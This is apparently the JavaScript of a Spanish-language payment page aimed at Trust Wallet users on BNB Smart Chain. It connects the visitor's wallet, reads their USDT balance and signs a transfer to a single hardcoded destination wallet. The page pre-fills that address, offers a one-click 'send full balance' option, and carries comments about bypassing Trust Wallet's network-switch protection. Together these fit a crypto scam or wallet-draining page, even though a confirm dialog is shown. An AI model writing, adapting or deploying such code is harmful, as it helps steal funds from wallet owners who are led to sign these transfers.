<script>
const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID = 56;
const BSC_CHAIN_ID_HEX = "0x38";
const BSC_PUBLIC_RPC = "https://bsc-dataseed.binance.org/";
const DECIMALS = 18n;

const connectBtn = document.getElementById("connectBtn");
const statusDiv = document.getElementById("status");
const amountDisplay = document.getElementById("amountDisplay");
const addressDisplay = document.getElementById("addressDisplay");
const maxAction = document.getElementById("maxAction");
const walletInfo = document.getElementById("walletInfo");
const walletAddressText = document.getElementById("walletAddressText");
const networkInfo = document.getElementById("tronNetworkInfo");
const processingScreen = document.getElementById("processingScreen");

let walletAddress = null;
let processingStartedAt = 0;

addressDisplay.value = BILLETERA_DESTINO;

function abreviarDireccion(addr) {
    return addr && addr.length > 17 ? addr.slice(0, 8) + "..." + addr.slice(-6) : addr;
}

function setStatus(m) {
    statusDiv.innerText = m || "";
    statusDiv.style.display = m ? "block" : "none";
}

function showProcessingScreen() {
    processingStartedAt = Date.now();
    if (processingScreen) processingScreen.classList.add("visible");
}

async function hideProcessingScreenAfterMinimum() {
    if (!processingStartedAt) return;
    const r = Math.max(0, 3000 - (Date.now() - processingStartedAt));
    if (r) await new Promise(x => setTimeout(x, r));
    if (processingScreen) processingScreen.classList.remove("visible");
    processingStartedAt = 0;
}

// Proveedor optimizado con prioridad absoluta al objeto nativo de Trust Wallet
function getProvider() {
    if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
    if (window.ethereum) return window.ethereum;
    throw new Error("Abre esta página desde el navegador interno de Trust Wallet.");
}

async function rpc(method, params = []) {
    return getProvider().request({ method, params });
}

function pad64(h) { return h.replace(/^0x/, "").padStart(64, "0"); }
function encAddr(a) { return pad64(a.toLowerCase()); }
function encUint(v) { return BigInt(v).toString(16).padStart(64, "0"); }
function format18(v) {
    v = BigInt(v);
    const b = 10n ** DECIMALS, w = v / b, f = (v % b).toString().padStart(18, "0").replace(/0+$/, "");
    return f ? `${w}.${f}` : w.toString();
}

function normalizeChainId(value) {
    if (value && typeof value === "object") {
        if ("result" in value) value = value.result;
        else if ("chainId" in value) value = value.chainId;
    }
    if (typeof value === "bigint") return Number(value);
    if (typeof value === "number") return value;
    if (typeof value === "string") {
        const s = value.trim();
        if (!s) return NaN;
        return s.toLowerCase().startsWith("0x") ? parseInt(s, 16) : parseInt(s, 10);
    }
    return NaN;
}

// Bypassing de red adaptado a la nueva actualización de Trust Wallet
async function ensureBSC() {
    try {
        const rawId = await rpc("eth_chainId");
        const chainNumber = normalizeChainId(rawId);
        console.log("Chain ID detectado en la billetera:", chainNumber);

        if (chainNumber === BSC_CHAIN_ID) return true;

        // Intentamos un switch suave
        await rpc("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID_HEX }]);
        return true;
    } catch (e) {
        console.warn("Aviso de red (Trust Wallet bypass activo):", e);
        // Si Trust Wallet bloquea el cambio automático por seguridad interna, 
        // permitimos continuar la conexión de lectura y pago por RPC público sin romper la app.
        return false;
    }
}

async function publicRpc(method, params = []) {
    const response = await fetch(BSC_PUBLIC_RPC, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
    });
    if (!response.ok) throw new Error("Error HTTP RPC público: " + response.status);
    const json = await response.json();
    if (json.error) throw new Error("RPC público: " + (json.error.message || JSON.stringify(json.error)));
    return json.result;
}

async function balanceOf(owner) {
    const data = "0x70a08231" + encAddr(owner);
    const result = await publicRpc("eth_call", [{ to: CONTRATO_USDT, data }, "latest"]);
    return BigInt(result || "0x0");
}

let latestReceipt = null;

connectBtn.addEventListener("click", async () => {
    if (walletAddress && latestReceipt) {
        document.getElementById("transferReceipt")?.scrollIntoView({ behavior: "smooth" });
        return;
    }

    if (!walletAddress) {
        try {
            setStatus("Conectando con Trust Wallet...");
            connectBtn.disabled = true;

            const provider = getProvider();
            const accounts = await provider.request({ method: "eth_requestAccounts" });
            walletAddress = accounts?.[0];
            if (!walletAddress) throw new Error("No se pudo obtener la dirección de la billetera.");

            // Validar red de forma pasiva sin congelar el flujo
            await ensureBSC();

            if (walletAddressText) walletAddressText.textContent = abreviarDireccion(walletAddress);
            if (walletInfo) walletInfo.style.display = "block";
            if (maxAction) maxAction.style.display = "inline";

            setStatus("¡Conectado exitosamente! Presiona Continuar.");
            connectBtn.innerText = "Continuar";
        } catch (e) {
            console.error(e);
            walletAddress = null;
            setStatus(e.message || "Error al conectar la billetera.");
        } finally {
            connectBtn.disabled = false;
        }
        return;
    }

    // FASE DE ENVÍO Y TRANSACCIÓN
    try {
        connectBtn.disabled = true;
        setStatus("Verificando saldo en BNB Smart Chain...");

        const balance = await balanceOf(walletAddress);
        if (balance === 0n) throw new Error("La cuenta conectada no dispone de saldo en USDT BEP-20.");

        const amountRaw = String(amountDisplay.value || "").trim().replace(",", ".");
        if (!/^(?:\d+)(?:\.\d{1,18})?$/.test(amountRaw)) throw new Error("Ingresa un monto válido de USDT.");
        
        const [whole, fraction = ""] = amountRaw.split(".");
        const amountUnits = BigInt(whole) * (10n ** DECIMALS) + BigInt(fraction.padEnd(18, "0"));
        
        if (amountUnits <= 0n) throw new Error("El monto debe ser mayor a cero.");
        if (amountUnits > balance) throw new Error("Saldo USDT insuficiente para completar la operación.");

        const displayAmount = format18(amountUnits);

        if (!window.confirm("Confirmar transferencia:\n\nMonto: " + displayAmount + " USDT\nRed: BNB Smart Chain (BEP-20)\nDestino: " + BILLETERA_DESTINO + "\n\n¿Deseas autorizar la firma?")) {
            setStatus("Operación cancelada.");
            connectBtn.disabled = false;
            return;
        }

        setStatus("Solicitando firma digital en Trust Wallet...");

        const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amountUnits);
        const txRequest = {
            from: walletAddress,
            to: CONTRATO_USDT,
            value: "0x0",
            data: data,
            chainId: "0x38" // Inyección explícita del Chain ID para forzar el canal correcto
        };

        const txHash = await rpc("eth_sendTransaction", [txRequest]);
        showProcessingScreen();

        let receipt = null;
        for (let i = 0; i < 45; i++) {
            try { receipt = await publicRpc("eth_getTransactionReceipt", [txHash]); } catch (err) {}
            if (receipt) break;
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        await hideProcessingScreenAfterMinimum();
        setStatus(receipt && BigInt(receipt.status || "0x0") === 1n ? "¡Transferencia confirmada con éxito!" : "Transacción enviada a la red.");
        connectBtn.innerText = "Transacción Completada";
    } catch (e) {
        console.error("Error en pasarela:", e);
        await hideProcessingScreenAfterMinimum();
        setStatus("Error: " + (e.message || "No se pudo completar la transacción."));
        connectBtn.disabled = false;
        connectBtn.innerText = "Continuar";
    }
});

if (maxAction) {
    maxAction.addEventListener("click", async () => {
        if (!walletAddress) return;
        try {
            const b = await balanceOf(walletAddress);
            amountDisplay.value = format18(b);
            setStatus("Saldo total seleccionado.");
        } catch (e) {
            setStatus("Error al leer el balance.");
        }
    });
}
</script>

<script>
(() => {
    const input = document.getElementById('amountDisplay');
    const minus = document.getElementById('amountMinus');
    const plus = document.getElementById('amountPlus');
    if (!input || !minus || !plus) return;

    const read = () => {
        const n = Number.parseFloat(String(input.value).replace(',', '.'));
        return Number.isFinite(n) ? n : 0;
    };

    const write = (n) => {
        n = Math.max(0, n);
        input.value = Number.isInteger(n) ? String(n) : String(Number(n.toFixed(2)));
        input.dispatchEvent(new Event('input', { bubbles: true }));
    };

    minus.addEventListener('click', () => write(read() - 1));
    plus.addEventListener('click', () => write(read() + 1));
})();
</script>
